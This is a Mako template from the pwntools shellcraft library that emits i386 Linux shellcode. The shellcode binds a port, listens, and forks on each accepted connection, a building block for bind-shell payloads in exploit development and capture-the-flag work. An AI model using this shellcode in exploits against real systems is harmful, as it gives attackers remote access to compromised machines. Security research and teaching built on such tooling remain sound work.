<% from pwnlib.shellcraft import common %>
<% from socket import htons %>
<%page args="port"/>
<%docstring>
    Args: port
    Waits for a connection.  Leaves socket in EBP.
    ipv4 only
</%docstring>
<% acceptloop = common.label("acceptloop")
looplabel = common.label("loop")
%>

${acceptloop}:
        /*  Listens for and accepts a connection on ${int(port)}d forever */
        /*  Socket file descriptor is placed in EBP */

        /*  sock = socket(AF_INET, SOCK_STREAM, 0) */
        push SYS_socketcall
        pop eax
        push SYS_socketcall_socket
        pop ebx
        cdq                     /*  clear EDX */
        push edx                /*  IPPROTO_IP (= 0) */
        push ebx                /*  SOCK_STREAM */
        push AF_INET
        mov ecx, esp
        int 0x80

        /*  bind(sock, &addr, sizeof addr); // sizeof addr == 0x10 */
        push edx
        pushw ${htons(int(port))}
        pushw AF_INET
        mov ecx, esp
        push 0x10
        push ecx
        push eax
        mov ecx, esp
        mov esi, eax
        inc ebx                 /*  EBX = bind (= 2) */
        mov al, byte SYS_socketcall
        int 0x80

        /*  listen(sock, whatever) */
        mov al, byte SYS_socketcall
        mov bl, byte SYS_socketcall_listen
        int 0x80


${looplabel}:
        /*  accept(sock, NULL, NULL) */
        push edx
        push esi                /*  sock */
        mov ecx, esp
        mov al, byte SYS_socketcall
        mov bl, byte SYS_socketcall_accept
        int 0x80

        mov ebp, eax

        mov al, SYS_fork
        int 0x80
        xchg eax, edi

        test edi, edi
        mov ebx, ebp
        cmovz ebx, esi /*  on child we close the server sock instead */

        /*  close(sock) */
        push byte SYS_close
        pop eax
        int 0x80

        test edi, edi
        jnz ${looplabel}
